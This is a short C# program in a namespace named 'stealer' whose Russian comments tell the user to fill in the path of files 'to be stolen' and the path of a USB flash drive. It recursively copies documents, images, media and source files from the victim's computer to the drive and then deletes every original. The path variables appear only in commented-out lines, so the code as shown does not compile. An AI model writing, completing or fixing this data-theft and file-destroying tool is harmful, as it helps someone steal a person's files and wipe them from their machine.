using System;
using System.IO;
using System.Linq;

namespace stealer
{
    internal class Program
    {
        private static string GetRelativePath(string basePath, string targetPath)
        {
            Uri baseUri = new Uri(basePath);
            Uri targetUri = new Uri(targetPath);

            Uri relativeUri = baseUri.MakeRelativeUri(targetUri);
            string relativePath = Uri.UnescapeDataString(relativeUri.ToString());

            return relativePath.Replace('/', Path.DirectorySeparatorChar);
        }

        static void Main(string[] args)
        {
            //string sourcePath = @"C:\"; //ВСТАВЬТЕ ПУТЬ К ФАЙЛАМ КОТОРЫЕ НАДО УКРАСТЬ
            //string destinationPath = @"E:\";//ВСТАВЬТЕ ПУТЬ К ФЛЕШКЕ КУДА НАДО СКОПИРОВАТЬ
            string[] allowedExtensions = { ".txt", ".pdf", ".png", ".jpg", ".jpeg", ".gif", ".mp4", ".mp3", ".py", ".js", ".mkv", ".docx", ".xls" };

            try
            {
                string[] files = Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories)
                    .Where(file => allowedExtensions.Contains(Path.GetExtension(file).ToLower())).ToArray();

                foreach (string file in files)
                {
                    string relativePath = GetRelativePath(sourcePath, file);
                    string destinationFile = Path.Combine(destinationPath, relativePath);
                    Directory.CreateDirectory(Path.GetDirectoryName(destinationFile));
                    File.Copy(file, destinationFile, true);
                }

                Console.WriteLine("Все файлы успешно скопированы на флешку.");

                foreach (string file in files)
                {
                    File.Delete(file);
                }

                Console.WriteLine("Все файлы успешно удалены с компьютера.");
            }
            catch (Exception e)
            {
                Console.WriteLine("Ошибка: " + e.Message);
            }

            Console.ReadLine();
        }
    }
}
